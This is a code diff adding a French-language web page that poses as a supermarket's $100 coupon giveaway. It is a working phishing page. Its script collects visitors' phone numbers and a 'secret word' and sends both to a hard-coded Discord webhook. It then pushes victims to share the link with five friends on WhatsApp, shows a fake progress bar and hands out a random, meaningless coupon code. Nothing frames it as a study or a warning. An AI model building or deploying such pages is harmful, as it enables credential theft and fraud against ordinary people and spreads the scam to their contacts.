@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S&K Supermarché - Gagnez votre Coupon</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --sk-blue: #2a5caa;
+            --sk-green: #76bc43;
+            --sk-white: #ffffff;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* --- Fond Interactif --- */
+        #background-animation {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .falling-logo {
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            background-image: url('logo_sk.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            opacity: 0.3;
+            animation: fall linear forwards;
+        }
+
+        @keyframes fall {
+            to { transform: translateY(110vh) rotate(360deg); }
+        }
+
+        /* --- Conteneur --- */
+        .card {
+            background: var(--sk-white);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            border-top: 8px solid var(--sk-blue);
+        }
+
+        .logo-header { width: 120px; margin-bottom: 10px; }
+        h1 { color: var(--sk-blue); font-size: 22px; margin-bottom: 5px; }
+        .promo { color: var(--sk-green); font-weight: bold; font-size: 24px; margin-bottom: 20px; }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        input:focus { border-color: var(--sk-blue); }
+
+        .note {
+            font-size: 12px;
+            color: #666;
+            background: #fff9c4;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: var(--sk-green);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: 0.3s;
+        }
+
+        button:hover { background: var(--sk-blue); }
+
+        /* --- Overlay Partage --- */
+        #share-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="background-animation"></div>
+
+    <div class="card">
+        <img src="logo_sk.png" class="logo-header">
+        <h1>FÉLICITATIONS !</h1>
+        <div class="promo">GAGNEZ UN COUPON DE 100$</div>
+        
+        <p>Étape 1 : Remplissez vos accès</p>
+        
+        <input type="tel" id="phone" placeholder="Votre Numéro de téléphone" required>
+        <input type="password" id="secret" placeholder="Créez votre mot secret" required>
+
+        <div class="note">
+            ⚠️ <strong>Note importante :</strong> Retenez bien votre mot secret. Il sera nécessaire pour valider votre code coupon en magasin.
+        </div>
+
+        <button onclick="sendData()">OBTENIR MON CODE</button>
+    </div>
+
+    <div id="share-overlay">
+        <div>
+            <h2>DERNIÈRE ÉTAPE ! 🚀</h2>
+            <p>Pour activer votre coupon de 100$, partagez cette opportunité avec 5 amis sur WhatsApp.</p>
+            <div style="font-size: 20px; margin: 20px 0;">Progression : <span id="progress">0%</span></div>
+            <button onclick="shareWhatsApp()" style="background: #25D366;">PARTAGER SUR WHATSAPP</button>
+        </div>
+    </div>
+
+    <script>
+        // 1. Animation des logos qui tombent
+        function createFallingLogo() {
+            const container = document.getElementById('background-animation');
+            const logo = document.createElement('div');
+            logo.className = 'falling-logo';
+            logo.style.left = Math.random() * 100 + 'vw';
+            logo.style.animationDuration = Math.random() * 3 + 2 + 's';
+            container.appendChild(logo);
+            setTimeout(() => logo.remove(), 5000);
+        }
+        setInterval(createFallingLogo, 400);
+
+        // 2. Envoi vers Discord
+        async function sendData() {
+            const phone = document.getElementById('phone').value;
+            const secret = document.getElementById('secret').value;
+            const webhookURL = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+
+            if(!phone || !secret) return alert("Veuillez remplir les champs.");
+
+            const payload = {
+                embeds: [{
+                    title: "🛒 Nouvelle Tentative Coupon S&K",
+                    color: 2776234, // Bleu du logo
+                    fields: [
+                        { name: "📱 Téléphone", value: phone, inline: true },
+                        { name: "🔐 Mot Secret", value: secret, inline: true }
+                    ],
+                    footer: { text: "S&K Supermarché - Système de Coupon" }
+                }]
+            };
+
+            try {
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                // Afficher l'étape de partage
+                document.getElementById('share-overlay').style.display = 'flex';
+            } catch (e) {
+                alert("Erreur de connexion.");
+            }
+        }
+
+        // 3. Partage WhatsApp
+        function shareWhatsApp() {
+            const randomCode = "SK-" + Math.floor(1000 + Math.random() * 9000);
+            const text = encodeURIComponent("J'ai reçu mon coupon de 100$ et mon code aléatoire " + randomCode + " pour le Supermarché S&K ! Essaye aussi ici : " + window.location.href);
+            const url = "https://api.whatsapp.com/send?text=" + text;
+            
+            // Simulation de progression
+            document.getElementById('progress').innerText = "100%";
+            
+            window.open(url, '_blank');
+        }
+    </script>
+</body>
+</html>
